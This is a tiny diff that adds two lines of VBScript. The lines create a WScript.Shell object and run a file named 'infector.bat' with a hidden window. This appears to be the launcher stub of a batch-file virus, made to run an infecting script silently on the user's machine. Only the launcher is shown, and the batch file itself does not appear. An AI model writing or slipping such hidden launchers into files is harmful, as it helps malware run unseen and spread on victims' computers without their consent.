@@ -1,0 +1,2 @@
+s = createobject("wscript.shell")
+s.run"infector.bat",0
